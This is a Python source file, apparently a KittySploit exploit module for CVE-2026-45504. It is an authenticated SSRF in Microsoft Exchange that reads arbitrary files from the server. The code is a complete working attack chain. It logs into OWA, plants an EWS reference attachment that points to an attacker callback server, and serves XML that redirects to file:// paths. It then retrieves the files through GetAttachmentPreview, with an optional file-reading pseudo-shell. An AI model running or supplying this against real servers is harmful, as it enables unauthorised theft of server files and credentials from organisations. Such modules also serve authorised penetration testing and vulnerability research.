#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import urllib.parse

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.http_server import Http_server
from lib.protocols.http.lfi import Lfi

_CREATE_ITEM_RE = re.compile(
    r'Id="([A-Za-z0-9+/=]+)".*?ChangeKey="([A-Za-z0-9+/=]+)"',
    re.S,
)
_CREATE_ATTACHMENT_RE = re.compile(
    r'Id="([A-Za-z0-9+/=]+)".*?RootItemId',
    re.S,
)
_WIN_INI_RE = re.compile(r"\[(fonts|extensions|mci extensions)\]", re.I)

_CREATE_ITEM_SOAP = b"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header><t:RequestServerVersion Version="Exchange2016"/></soap:Header>
  <soap:Body>
    <m:CreateItem MessageDisposition="SaveOnly">
      <m:SavedItemFolderId><t:DistinguishedFolderId Id="drafts"/></m:SavedItemFolderId>
      <m:Items><t:Message><t:Subject>lfi</t:Subject><t:Body BodyType="HTML">x</t:Body></t:Message></m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>"""


class Module(Auxiliary, Http_client, Http_server, Lfi):

    __info__ = {
        "name": "Microsoft Exchange SSRF arbitrary file read (CVE-2026-45504)",
        "description": (
            "CVE-2026-45504: authenticated Microsoft Exchange Server arbitrary file read via "
            "EWS reference-attachment SSRF and OWA GetAttachmentPreview. Valid domain credentials "
            "are required; a callback HTTP server reachable by the Exchange host serves a "
            "OneDrive-style XML response pointing at a local file:// path. Uses "
            "lib.protocols.http.lfi (file_read / shell_lfi) — no payload or shell."
        ),
        "author": ["Batuhan Er (@int20z)", "KittySploit Team"],
        "cve": ["CVE-2026-45504"],
        "references": [],
        "platform": Platform.WINDOWS,
        "tags": [
            "exchange",
            "owa",
            "ews",
            "ssrf",
            "lfi",
            "file-read",
            "authenticated",
            "cve-2026-45504",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
        },
    }

    port = OptPort(443, "Exchange HTTPS port", True)
    ssl = OptBool(True, "Use HTTPS", True, advanced=True)
    domain = OptString("", "AD domain (optional if DOMAIN\\user is in username)", required=False)
    username = OptString("", "Exchange username (DOMAIN\\user or user@domain)", required=True)
    password = OptString("", "Account password", required=True)
    callback_host = OptString(
        "",
        "Host/IP reachable by Exchange for the SSRF callback (attacker address)",
        required=True,
    )
    srvport = OptPort(8780, "Local callback HTTP port", True)
    file_read = OptString(
        "C:/windows/win.ini",
        "Remote file path to read via file:// SSRF",
        required=True,
    )
    output_file = OptString("", "Local file to write the retrieved content", required=False)
    output_limit = OptInteger(
        12000,
        "Max characters to print when output_file is empty (0 = full)",
        required=False,
        advanced=True,
    )

    def _principal(self) -> str:
        dom = str(self.domain or "").strip()
        user = str(self.username or "").strip()
        if not user:
            return ""
        if "@" in user and not dom:
            user, dom = user.split("@", 1)
        elif "\\" in user:
            dom, user = user.split("\\", 1)
        return f"{dom}\\{user}" if dom else user

    def _base_url(self) -> str:
        target = str(self.target or "").strip()
        if not target:
            raise ValueError("target is required")
        port = int(self.port or 443)
        ssl = self.ssl
        if isinstance(ssl, str):
            ssl = ssl.strip().lower() in ("true", "yes", "y", "1", "on")
        protocol = "https" if ssl or port == 443 else "http"
        return f"{protocol}://{target}:{port}"

    def _verify_ssl(self) -> bool:
        verify = self.verify_ssl
        if hasattr(verify, "value"):
            verify = verify.value
        return bool(verify)

    def _ntlm_auth(self):
        try:
            from requests_ntlm import HttpNtlmAuth
        except ImportError as exc:
            raise ImportError(
                "requests-ntlm is required for Exchange EWS NTLM authentication "
                "(pip install requests-ntlm)"
            ) from exc
        return HttpNtlmAuth(self._principal(), str(self.password or ""))

    def _callback_url(self) -> str:
        host = str(self.callback_host or "").strip()
        if not host:
            raise ValueError("callback_host is required")
        return f"http://{host}:{int(self.srvport)}"

    def _ssrf_callback_body(self, file_path: str) -> bytes:
        escaped = (file_path or "").replace(" ", "%20")
        return (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<root xmlns:d="http://schemas.microsoft.com/ado/2007/08/dataservices">'
            f"<d:WebApplicationUrl>file:///{escaped}#</d:WebApplicationUrl>"
            "<d:AccessToken>x</d:AccessToken>"
            "<d:AccessTokenTtl>3600</d:AccessTokenTtl>"
            "</root>"
        ).encode("utf-8")

    def _looks_like_win_ini(self, content) -> bool:
        if content is None:
            return False
        if isinstance(content, (bytes, bytearray)):
            text = bytes(content).decode("utf-8", errors="replace")
        else:
            text = str(content)
        return bool(_WIN_INI_RE.search(text))

    def _start_callback_server(self, remote_path: str):
        body = self._ssrf_callback_body(remote_path)

        def get(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/xml; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        return self.listen_http({"GET": get}, forever=True, background=True)

    def _owa_login(self, base_url: str, timeout: int):
        verify = self._verify_ssl()
        r = self.session.post(
            f"{base_url}/owa/auth.owa",
            data={
                "destination": f"{base_url}/owa/",
                "flags": "4",
                "forcedownlevel": "0",
                "username": self._principal(),
                "password": str(self.password or ""),
                "isUtf8": "1",
            },
            allow_redirects=False,
            timeout=timeout,
            verify=verify,
        )
        location = (r.headers.get("Location") or "").lower()
        if "reason=2" in location or "logon.aspx" in location:
            raise RuntimeError("OWA login failed")

        self.session.get(f"{base_url}/owa/", allow_redirects=True, timeout=timeout, verify=verify)
        canary = next((c.value for c in self.session.cookies if "canary" in c.name.lower()), None)
        if not canary:
            raise RuntimeError("OWA login failed (missing canary cookie)")
        return canary

    def _create_reference_attachment(self, base_url: str, callback_base_url: str, timeout: int) -> str:
        verify = self._verify_ssl()
        ntlm = self._ntlm_auth()
        callback_base_url = callback_base_url.rstrip("/")

        r = requests.post(
            f"{base_url}/ews/exchange.asmx",
            data=_CREATE_ITEM_SOAP,
            headers={"Content-Type": "text/xml; charset=utf-8"},
            auth=ntlm,
            verify=verify,
            timeout=timeout,
        )
        m = _CREATE_ITEM_RE.search(r.text or "")
        if not m:
            raise RuntimeError("EWS CreateItem failed")
        item_id, item_ck = m.group(1), m.group(2)

        create_attachment = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header><t:RequestServerVersion Version="Exchange2016"/></soap:Header>
  <soap:Body>
    <m:CreateAttachment>
      <m:ParentItemId Id="{item_id}" ChangeKey="{item_ck}"/>
      <m:Attachments>
        <t:ReferenceAttachment>
          <t:Name>doc.docx</t:Name>
          <t:AttachLongPathName>{callback_base_url}/doc.docx</t:AttachLongPathName>
          <t:ProviderType>OneDrivePro</t:ProviderType>
          <t:ProviderEndpointUrl>{callback_base_url}/</t:ProviderEndpointUrl>
        </t:ReferenceAttachment>
      </m:Attachments>
    </m:CreateAttachment>
  </soap:Body>
</soap:Envelope>""".encode()

        r2 = requests.post(
            f"{base_url}/ews/exchange.asmx",
            data=create_attachment,
            headers={"Content-Type": "text/xml; charset=utf-8"},
            auth=ntlm,
            verify=verify,
            timeout=timeout,
        )
        m2 = _CREATE_ATTACHMENT_RE.search(r2.text or "")
        if not m2:
            raise RuntimeError("EWS CreateAttachment failed")
        return m2.group(1)

    def _read_attachment(self, base_url: str, canary: str, attachment_id: str, timeout: int) -> bytes:
        enc = urllib.parse.quote(attachment_id, safe="")
        r = self.session.post(
            f"{base_url}/owa/service.svc?action=GetAttachmentPreview&id={enc}",
            data="{}",
            headers={
                "Content-Type": "application/json; charset=utf-8",
                "X-OWA-CANARY": canary,
                "Action": "GetAttachmentPreview",
            },
            verify=self._verify_ssl(),
            timeout=timeout,
        )
        return r.content or b""

    def _read_remote_file(self, remote_path: str, callback_base_url: str, timeout: int):
        base_url = self._base_url()
        try:
            canary = self._owa_login(base_url, timeout)
        except RuntimeError:
            return b"", "login"

        try:
            att_id = self._create_reference_attachment(base_url, callback_base_url, timeout)
        except RuntimeError:
            return b"", "attach"

        content = self._read_attachment(base_url, canary, att_id, timeout)
        if not content:
            return b"", "empty"
        return content, "ok"

    def execute(self, file_path: str) -> str:
        """Lfi mixin hook: read ``file_path`` on the Exchange server via SSRF."""
        p = (file_path or "").strip()
        if not p:
            return ""

        httpd = None
        timeout = max(int(self.timeout or 10), 120)
        try:
            httpd = self._start_callback_server(p)
            content, status = self._read_remote_file(p, self._callback_url(), timeout)
        finally:
            if httpd:
                self.web_shutdown(httpd)

        if status == "login":
            print_error("OWA login failed; check domain/username/password")
            return ""
        if status == "attach":
            print_error("EWS reference attachment creation failed")
            return ""
        if status == "empty":
            print_error("GetAttachmentPreview returned empty content")
            return ""

        print_success(f"Read succeeded ({len(content)} bytes)")
        return content.decode("utf-8", errors="replace")

    def check(self):
        probe = "C:/windows/win.ini"
        try:
            self._base_url()
        except Exception as e:
            return {"vulnerable": False, "reason": f"Invalid target: {e}", "confidence": "low"}

        try:
            data = self.execute(probe)
        except Exception as e:
            return {"vulnerable": False, "reason": f"Request failed: {e}", "confidence": "low"}

        if not data:
            return {
                "vulnerable": False,
                "reason": "Authenticated chain failed or file read returned nothing",
                "confidence": "medium",
            }
        if self._looks_like_win_ini(data):
            return {
                "vulnerable": True,
                "reason": f"CVE-2026-45504 confirmed: {probe} read via SSRF",
                "details": f"{probe} read via EWS/OWA SSRF chain",
                "confidence": "high",
            }
        return {
            "vulnerable": True,
            "reason": "File-read chain returned content, but win.ini markers were unexpected",
            "details": f"Received {len(data)} bytes from {probe}",
            "confidence": "medium",
        }

    def run(self):
        principal = self._principal()
        if not principal:
            print_error("username is required")
            return False

        print_status(f"User     : {principal}")
        print_status(f"Callback : {self._callback_url()}")

        if self.shell_lfi:
            print_status("LFI pseudo-shell (paths are read via Exchange SSRF)")
            self.handler_lfi()
            return True

        data = self.execute(str(self.file_read or "").strip())
        if not data:
            return False

        local = str(self.output_file or "").strip()
        if local:
            try:
                with open(local, "w", encoding="utf-8", errors="ignore") as fh:
                    fh.write(data)
                print_success(f"Wrote {len(data)} bytes to {local}")
            except OSError as e:
                print_error(f"Could not write output_file: {e}")
                return False
            return True

        limit = int(self.output_limit or 0)
        if limit > 0 and len(data) > limit:
            print_info(data[:limit] + "\n... [truncated]")
        else:
            print_info(data)
        return True
